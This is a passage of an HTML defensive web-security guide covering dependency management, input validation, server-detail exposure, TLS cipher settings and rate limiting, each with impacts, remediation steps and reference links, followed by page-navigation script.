                    <p><b>2. Keep dependencies up to date:</b></p>
                    <p>Apply security patches and updates promptly.</p>
                    <p><b>3. Use trusted and well-maintained libraries:</b></p>
                    <p>Prefer popular, actively maintained components with good security records.</p>
                    <p><b>4. Minimize dependencies:</b></p>
                    <p>Only include necessary libraries to reduce the attack surface.</p>
                    <p><b>5. Audit third-party code:</b></p>
                    <p>Review critical dependencies manually or with code scanners.</p>
                    <p><b>6. Establish a dependency management policy:</b></p>
                    <p>Enforce rules around updating and vetting dependencies.</p>
                    <p><b>7. Consider alternatives or forks:</b></p>
                    <p>If a library is abandoned and vulnerable, consider migrating to a safer alternative or maintaining a patched fork.</p>
                </div>
                
                <h3>üîó Reference Links:</h3>
                <p><a href="https://owasp.org/www-project-dependency-check/">https://owasp.org/www-project-dependency-check/</a></p>
                <p><a href="https://owasp.org/www-project-software-component-verification-standard/">https://owasp.org/www-project-software-component-verification-standard/</a></p>
                <p><a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/</a></p>
            </div>

            <!-- Topic 26: Input Validation -->
            <div id="input-validation" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-keyboard"></i>
                    </div>
                    <h2>26. User input validation</h2>
                </div>
                
                <h3>üìå What Happens When the Application Is Not Validating User Input Data?</h3>
                <p>When an application fails to <b>validate user input</b>, it means it accepts data from users without checking if the data is in the expected format, type, length, or content. This opens the door to many issues because malicious or malformed data can enter your system.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact of Not Validating User Input</h3>
                    <p><b>Injection Attacks:</b> Like SQL Injection, Command Injection, or NoSQL Injection where attackers inject malicious queries or commands.</p>
                    <p><b>Cross-Site Scripting (XSS):</b> Attackers inject malicious scripts into web pages viewed by other users.</p>
                    <p><b>Buffer Overflow:</b> Improper input size handling can crash or compromise the system.</p>
                    <p><b>Authentication bypass:</b> If inputs like usernames or tokens aren't properly validated, attackers might bypass controls.</p>
                    <p><b>Application crashes or unexpected behavior:</b> Caused by malformed or unexpected input.</p>
                    <p><b>Data corruption:</b> Invalid data can corrupt your database or internal logic.</p>
                    <p><b>Security misconfigurations:</b> Inputs might be used in config or system calls, leading to vulnerabilities.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <p><b>1. Implement strict input validation</b> on both client and server sides.</p>
                    <p><b>2. Validate by type, format, length, and content:</b> Accept only what's expected.</p>
                    <p><b>3. Use allow-list (whitelist) validation rather than deny-list (blacklist).</b></p>
                    <p><b>4. Sanitize inputs:</b> Remove or encode dangerous characters to prevent injections.</p>
                    <p><b>5. Use built-in validation libraries or frameworks</b> that are well-maintained.</p>
                    <p><b>6. Reject invalid input immediately</b> with meaningful error messages.</p>
                    <p><b>7. Perform server-side validation as the ultimate gatekeeper,</b> since client-side validation can be bypassed.</p>
                    <p><b>8. Use parameterized queries for database access</b> to avoid injection risks.</p>
                    <p><b>9. Encode output to prevent XSS</b> when displaying user input.</p>
                </div>
                
                <h3>üîó Reference Links:</h3>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html</a></p>
                <p><a href="https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Forms/Form_validation">https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Forms/Form_validation</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html</a></p>
                <p><a href="https://react-hook-form.com/get-started/">https://react-hook-form.com/get-started/</a></p>
            </div>

            <!-- Topic 27: Server Details -->
            <div id="server-details" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-server"></i>
                    </div>
                    <h2>27. Exposing Server Details</h2>
                </div>
                
                <h3>üìå What Happens When the Application Exposes Server Details via Application Errors or Response Headers?</h3>
                <p>When an application reveals server details such as: Server software name and version (e.g., Apache/2.4.41), Framework version, Detailed error stack traces or messages,</p>
                <p>through HTTP response headers or error pages, it unintentionally gives attackers useful information to craft targeted attacks.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact of Exposing Server Details</h3>
                    <p><b>Facilitates targeted attacks:</b> Attackers can identify vulnerabilities specific to the server or framework version.</p>
                    <p><b>Increases risk of automated scanning and exploitation:</b> Bots often scan for known vulnerable versions.</p>
                    <p><b>Information disclosure:</b> Sensitive internal details can leak, which might help in privilege escalation.</p>
                    <p><b>Helps attackers bypass security measures:</b> Knowing exact software makes it easier to exploit known weaknesses.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <p><b>1. Suppress detailed error messages on production environments:</b> Show generic, user-friendly error pages instead.</p>
                    <p><b>2. Remove or modify server response headers that reveal server info:</b></p>
                    <p>Common headers to remove or hide:</p>
                    <p>Server</p>
                    <p>X-Powered-By</p>
                    <p><b>3. Implement centralized error handling:</b></p>
                    <p>Log detailed errors internally (not exposed to users).</p>
                    <p>Present generic messages to clients.</p>
                    <p><b>4. Configure your web server and application server to hide version info:</b></p>
                    <p>Many servers have config options for this.</p>
                    <p><b>5. Perform regular security scans</b> to detect information disclosure.</p>
                </div>
                
                <h3>üîó Reference Links:</h3>
                <p><a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html">https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html</a></p>
                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Server">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Server</a></p>
                <p><a href="https://expressjs.com/en/advanced/best-practice-security.html#disable-x-powered-by-header">https://expressjs.com/en/advanced/best-practice-security.html#disable-x-powered-by-header</a></p>
            </div>

            <!-- Topic 28: TLS Security -->
            <div id="tls-security" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-lock"></i>
                    </div>
                    <h2>28. TLS Cipher Versions</h2>
                </div>
                
                <h3>üìå What is the Issue with TLS Cipher Versions?</h3>
                <p>TLS (Transport Layer Security) is a cryptographic protocol designed to provide secure communication over a computer network. Using outdated or weak TLS versions and cipher suites can expose your application to various security risks.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è What Is the Impact of TLS 1.0 Ciphers Being Enabled?</h3>
                    <p>TLS 1.0 is an <b>obsolete and insecure protocol version</b> (released in 1999). If TLS 1.0 or its cipher suites are enabled:</p>
                    <p><b>1. üîì Weak encryption</b> can be broken by modern attackers.</p>
                    <p><b>2. üß™ Susceptible to attacks</b> like BEAST, POODLE, and downgrade attacks.</p>
                    <p><b>3. üö´ Non-compliance</b> with standards such as PCI DSS, which requires disabling TLS 1.0.</p>
                    <p><b>4. üïµÔ∏è Data interception</b> by attackers who can exploit known vulnerabilities.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <p><b>1. Disable TLS 1.0 and TLS 1.1.</b></p>
                    <p><b>2. Enable only TLS 1.2 and TLS 1.3.</b></p>
                    <p><b>Allow only strong cipher suites,</b> such as:</p>
                    <p>TLS 1.2:</p>
                    <p>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</p>
                    <p>TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384</p>
                    <p>TLS 1.3:</p>
                    <p>Built-in strong ciphers, e.g., TLS_AES_128_GCM_SHA256</p>
                </div>
                
                <h3>üîó Reference Links:</h3>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html</a></p>
                <p><a href="https://csrc.nist.gov/pubs/sp/800/52/r2/final">https://csrc.nist.gov/pubs/sp/800/52/r2/final</a></p>
                <p><a href="https://blog.pcisecuritystandards.org/migrating-from-ssl-and-early-tls">https://blog.pcisecuritystandards.org/migrating-from-ssl-and-early-tls</a></p>
            </div>

    <!-- Topic 29: Rate Limiting -->
            <div id="rate-limiting" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>29. Rate Limiting</h2>
                </div>
                
                <h3>üìå Rate Limiting</h3>
                <p>A rate limiting vulnerability occurs when an application does not restrict the number of requests a user can make in a given time. This allows attackers to brute force passwords, abuse APIs, or overload servers, leading to account compromise or denial of service. The fix is to implement proper rate limits, lockouts, and monitoring.</p>
                <p><b>Definition:</b> Rate limiting controls how many requests a client can make in a set time.</p>
                <p><b>Vulnerability:</b> If missing or weak, attackers can send unlimited requests without restriction.</p>
                <p><b>Example:</b> A login form allows unlimited password attempts without delay or lockout.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact of the Issue</h3>
                    <p><b>Brute Force Attacks:</b> Attackers can guess passwords or OTPs quickly.</p>
                    <p><b>Denial of Service (DoS):</b> Excessive requests can overwhelm servers.</p>
                    <p><b>Resource Exhaustion:</b> CPU, memory, and bandwidth consumed by malicious traffic.</p>
                    <p><b>Business Risk:</b> Service downtime, user account compromise, and reputational damage.</p>
                    <p><b>Regulatory Risk:</b> Breaches of personal data may lead to compliance violations.</p>
                </div>

                <div class="attack-scenario-box">
                    <h3>üé≠ Attacker Scenarios & Examples</h3>
                    <p><b>Password Brute Force:</b> Attacker tries thousands of passwords on a login form until successful.</p>
                    <p><b>OTP Guessing:</b> Unlimited attempts to guess a one-time password or reset token.</p>
                    <p><b>API Abuse:</b> Attackers scrape data by sending millions of requests to an API endpoint.</p>
                    <p><b>Denial of Service:</b> Flooding requests to exhaust server resources and make the service unavailable.</p>
                    <p><b>Real-World Example:</b> Many APIs without rate limiting have been exploited to brute force password reset tokens, leading to account takeovers</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation</h3>
                    <p><b>Set Request Limits:</b> Define maximum requests per user/IP per minute./p>
                    <p><b>Account Lockouts:</b> Temporarily block accounts after repeated failed logins.</p>
                    <p><b>CAPTCHA / Bot Detection:</b> Prevent automated scripts from abusing endpoints.</p>
                    <p><b>Exponential Backoff:</b> Increase wait time after repeated failed attempts.</p>
                    <p><b>Distributed Rate Limiting:</b> Apply limits across load balancers and APIs consistently.</p>
                    <p><b>Monitoring & Alerts:</b> Detect unusual traffic spikes and respond quickly.</p>
                </div>
                
                <h3>üìö Reference Links:</h3>
                <p><a href="https://www.geeksforgeeks.org/computer-networks/no-rate-limiting-flaw-in-cyber-security/">https://www.geeksforgeeks.org/computer-networks/no-rate-limiting-flaw-in-cyber-security/</a></p>
                <p><a href="https://owasp.org/API-Security/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting/">https://owasp.org/API-Security/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting/</a></p>
                <p><a href="https://www.wallarm.com/what/lack-of-resources-rate-limiting">https://www.wallarm.com/what/lack-of-resources-rate-limiting</a></p>
            </div>

        </div>
    </main>

    <!-- Back to Top Button -->
    <div class="back-to-top">
        <i class="fas fa-arrow-up"></i>
    </div>

    <script>
        // Back to top button functionality
        const backToTopButton = document.querySelector('.back-to-top');
        
        window.addEventListener('scroll', () => {
            if (window.pageYOffset > 300) {
                backToTopButton.classList.add('visible');
            } else {
                backToTopButton.classList.remove('visible');
            }
        });
        
        backToTopButton.addEventListener('click', () => {
            window.scrollTo({
                top: 0,
                behavior: 'smooth'
            });
        });
        
        // Mobile menu toggle
        const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
        const sidebar = document.querySelector('.sidebar');
        
        mobileMenuBtn.addEventListener('click', () => {
            sidebar.classList.toggle('active');
        });
        
        // Navigation functionality
        const navLinks = document.querySelectorAll('.topic-list a');
        
        navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                
                // Remove active class from all links
                navLinks.forEach(l => l.classList.remove('active'));
                
                // Add active class to clicked link
                link.classList.add('active');
                
                // Get the target section
                const targetId = link.getAttribute('href').substring(1);
                const targetSection = document.getElementById(targetId);
                
                // Scroll to the target section
                if (targetSection) {
                    targetSection.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
                
                // Close mobile menu after clicking a link
                if (window.innerWidth <= 992) {
                    sidebar.classList.remove('active');
                }
            });
        });
        
        // Update active nav link based on scroll position
        const sections = document.querySelectorAll('.topic-card');
        
        window.addEventListener('scroll', () => {
            let current = '';
            
            sections.forEach(section => {
                const sectionTop = section.offsetTop - 100;
                const sectionHeight = section.clientHeight;
                
                if (pageYOffset >= sectionTop && pageYOffset < sectionTop + sectionHeight) {
                    current = section.getAttribute('id');
                }
            });
            
            navLinks.forEach(link => {
                link.classList.remove('active');
                if (link.getAttribute('href').substring(1) === current) {
                    link.classList.add('active');
                }
            });
        });
        
        // Close sidebar when clicking outside on mobile
        document.addEventListener('click', (e) => {
            if (window.innerWidth <= 992 && 
                !sidebar.contains(e.target) && 
                !mobileMenuBtn.contains(e.target) && 
                sidebar.classList.contains('active')) {
                sidebar.classList.remove('active');
            }
        });
    </script>
</body>
</html>